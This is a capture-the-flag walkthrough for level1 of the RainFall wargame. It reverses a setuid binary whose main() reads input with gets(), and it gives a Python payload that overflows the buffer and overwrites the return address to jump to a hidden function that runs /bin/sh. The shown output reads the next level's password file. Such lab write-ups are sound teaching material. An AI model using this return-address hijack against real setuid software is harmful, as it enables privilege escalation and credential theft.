# Walkthrough
## Program type:
* Running the command `file ./level1` we see the file is 32-bit ELF
executable.
```
level1@RainFall:~$ file ./level1
./level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
```
* Running the command `checksec --file ./level1`, we see that the stack is 
executable (NX disabled).

```
level1@RainFall:~$ checksec --file ./level1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level1
```
## Content:
* When we examine the `main` function we see that there's a call to only one
function `gets` which fills a buffer in `main`s stack frame and that's it, 
no direct call to run.
```
08048480 <main>:
 8048480:	55                   	push   ebp
 8048481:	89 e5                	mov    ebp,esp
 8048483:	83 e4 f0             	and    esp,0xfffffff0
 8048486:	83 ec 50             	sub    esp,0x50
 8048489:	8d 44 24 10          	lea    eax,[esp+0x10]
 804848d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave
 8048496:	c3                   	ret
```
* The command `objdump -M intel -d ./level1` shows extra function `run`, it has two function calls ['fwrite', 'system'], `fwrite` prints the string "Good... Wait what?\n" and `system` calls "/bin/sh".

```
08048444 <run>:
 8048444:	55                   	push   ebp
 8048445:	89 e5                	mov    ebp,esp
 8048447:	83 ec 18             	sub    esp,0x18
 804844a:	a1 c0 97 04 08       	mov    eax,ds:0x80497c0
 804844f:	89 c2                	mov    edx,eax
 8048451:	b8 70 85 04 08       	mov    eax,0x8048570
 8048456:	89 54 24 0c          	mov    DWORD PTR [esp+0xc],edx
 804845a:	c7 44 24 08 13 00 00 	mov    DWORD PTR [esp+0x8],0x13
 8048461:	00
 8048462:	c7 44 24 04 01 00 00 	mov    DWORD PTR [esp+0x4],0x1
 8048469:	00
 804846a:	89 04 24             	mov    DWORD PTR [esp],eax
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	mov    DWORD PTR [esp],0x8048584
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave
 804847f:	c3                   	ret
```

## Reversing:
Upon analyzing the disassembly code we concluded that the actual C code could be something as follows:

```C
#include <stdio.h>

void	run()
{
	fwrite("Good... Wait what?\n", 0x13, stdout);
	system("/bin/sh");
}

int	main()
{
	char	buffer[64];

	gets(buffer);
}

```

## Solution:
* The idea is to take advantage of the function `gets` to further write on
the stack and overwrite the eip of the `main`'s stack frame, so that when
it reached the end, eip register will contain the address of the function
`run` and execute a shell with `system`.

* Now lets write the python script that will enable us to access the shell using that vulnerability:

```python
import struct

print "\x90" * 76 + struct.pack('I', 0x08048444)

```
* Running the exploit give us access to an unauthorized shell:
```
level1@RainFall:~$ (python exp.py; cat -) |  ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```